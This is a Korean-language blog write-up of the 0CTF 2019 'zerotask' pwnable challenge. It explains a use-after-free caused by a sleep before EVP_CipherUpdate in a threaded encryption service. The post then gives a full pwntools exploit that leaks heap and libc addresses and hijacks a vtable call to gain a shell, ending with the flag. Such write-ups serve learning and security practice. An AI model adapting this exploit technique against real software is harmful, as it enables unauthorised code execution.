---
layout:     post
title:      "0CTF 2019 zerotask write-up"
subtitle:   "0ctf 2019 pwnable"
date:       2019-08-07
author:     "NextLine"
header-img: "img/post-bg-1.png"
tags:
    - WriteUp
---

# 0CTF 2019 zerotask write-up

### 1. Intro

대회때 빨리 풀어서 퍼블먹었던 문제이다. UAF 나는것만 찾으면 익스는 금방 할 수 있다.


### 2. Binary

```
1. Add task
2. Delete task
3. Go
Choice: 
```

1 : `EVP_CIPHER_CTX_new`와 `EVP_EncryptInit`를 호출하고 데이터를 저장한다.
2 : 1에서 만든 청크를 free한다.
3 : 1에서 만든 청크의 데이터를 encrypt/decrypt해서 보여준다.


### 3. Vulnerability

```c
void __fastcall __noreturn start_routine(Chunk *a1)
{
  int v1; // [rsp+14h] [rbp-2Ch]
  Chunk *_v2[2]; // [rsp+18h] [rbp-28h]
  __int64 v3; // [rsp+28h] [rbp-18h]
  __int64 v4; // [rsp+30h] [rbp-10h]
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]
  v5 = __readfsqword(0x28u);
  *_v2 = a1;
  v1 = 0;
  v3 = 0LL;
  v4 = 0LL;
  puts("Prepare...");
  sleep(2u);
  memset(text, 0, 0x1010uLL);
  if ( !EVP_CipherUpdate(_v2[0]->EVP_CIPHER_CTX, text, &v1, _v2[0]->data, _v2[0]->size) )
    pthread_exit(0LL);
  _v2[1] = (_v2[1] + v1);
  if ( !EVP_CipherFinal_ex(_v2[0]->EVP_CIPHER_CTX, text + _v2[1], &v1) )
    pthread_exit(0LL);
  _v2[1] = (_v2[1] + v1);
  puts("Ciphertext: ");
  print_text(stdout, text, _v2[1], 0x10uLL, 1uLL);
  pthread_exit(0LL);
}
```

3번 메뉴에서 쓰레드를 생성할 때 `EVP_CipherUpdate`를 하기전에 `sleep`으로 2초간 기다린다. 이때 청크를 삭제하면 use-after-free 취약점이 발생한다.


### 4. Exploit

1. 쓰레드에서 입력을 기다리고 있는 상태로 값을 쓰게되면 chunk를 부분적으로 overwrite할 수 있는데, 그걸 이용해서 heap주소를 leak할 수 있다.
2. heap 주소를 leak한 다음에는 전체 구조체를 덮어서 libc주소를 얻는다.
3. 마지막으로 `EVP_CIPHER_CTX` 포인터를 덮어서 `EVP_CipherUpdate`내부에서 사용하는 vtable call을 이용해 rip를 컨트롤 하면 된다.

```python
#from ntpwn import *
from pwn import *
from Crypto.Cipher import AES
KEY = 'B' * 0x20
IV = 'A' * 0x10
def decrypt(chunk):
    dec = AES.new(KEY, AES.MODE_CBC, IV)
    return dec.decrypt(chunk)
LOCAL = 0
def conn():
    if LOCAL:
        s = process('./task')
        #b = NT(s)
        #b.end()
    else:
        s = remote('111.186.63.201',10001)
    return s
s = conn()
sla = s.sendlineafter
sa = s.sendafter
def addtask(_id,endn,key,iv,datasize, data):
    sla(': ','1')
    sla(': ',str(_id))
    sla(': ',str(endn))
    sa(': ',str(key))
    sa(': ',str(iv))
    sla(': ',str(datasize))
    sa(': ',str(data))
def addtask2(_id,endn,key,iv,datasize):
    sla(': ','1')
    sla(': ',str(_id))
    sla(': ',str(endn))
    sa(': ',str(key))
    sa(': ',str(iv))
    sla(': ',str(datasize))
def addtask3(_id,endn,key,iv,datasize,data):
    sla(': ','1')
    sla(': ',str(_id))
    sla(': ',str(endn))
    sa(': ',str(key))
    sa(': ',str(iv))
    sla(': ',str(datasize))
    sa(': ',str(data))
def addtask4(_id,endn,key,iv,datasize,data):
    s.sendline('1')
    sla(': ',str(_id))
    sla(': ',str(endn))
    sa(': ',str(key))
    sa(': ',str(iv))
    sla(': ',str(datasize))
    sa(': ',str(data))
def dele(_id):
    sla(': ','2')
    sla(': ',str(_id))
def go(_id):
    sla(': ','3')
    sla(': ',str(_id))
lc = ELF('libcrypto.so.1.0.0')
# leak heap
addtask(1,1 , KEY, IV, 0x50, 'B' * 0x50)
addtask(2,1 , KEY, IV, 0x50, 'B' * 0x50)
go(1)
dele(2)
dele(1)
addtask2(1,1 , KEY, IV, 0x50)
s.recvuntil('Ciphertext:')
buf = ''
for i in range(7):
    buf += s.recvline()
buf = [chr(int(i,16)) for i in buf.split()]
heap = u64(decrypt("".join(buf))[:8])
s.info("heap @ " + hex(heap))
s.send('A' * 0x50)
#pause()
# leak libc
addtask(3,1 , KEY, IV, 0x8, 'B' * 0x8)
addtask(4,1 , KEY, IV, 0x8, 'B' * 0x8)
addtask(5,1 , KEY, IV, 0x8, 'C' * 0x8)
go(3)
dele(3)
dele(4)
data = p64(heap - 0x460)
data += p64(8)
data += p32(1)
data += KEY + IV
data += '\x00' * 0x14
data += p64(heap + 0x480)
data += p64(5)
data += p64(0)
addtask3(4,1 , KEY, IV, 0x70, data)
s.recvuntil('Ciphertext:')
for i in range(2):
    buf = s.recvline()
pause()
buf = [chr(int(i,16)) for i in buf.split()]
libc = u64(decrypt("".join(buf))[:8]) - 0x225620 - 0x200000 - 0x3f1000
s.info("libc @ " + hex(libc))
oneshot = libc + 0x10a38c
fake = 'A' * 0x10
fake += p64(heap + 0x808)
fake += p64(0) + "\x01\x00\x11\x00\x00\x00\x00\x00"
fake += p64(oneshot)
addtask4(7,1 , KEY, IV, len(fake), fake)
addtask(8,1 , KEY, IV, 0x8, 'B' * 0x8)
go(7)
dele(7)
dele(8)
data = p64(heap - 0x460)
data += p64(8)
data += p32(1)
data += KEY + IV
data += '\x00' * 0x14
data += p64(heap + 0x810)
data += p64(5)
addtask3(8,1, KEY, IV, 0x70, data)
s.interactive()
# flag{pl4y_w1th_u4F_ev3ryDay_63a9d2a26f275685665dc02b886b530e}
```
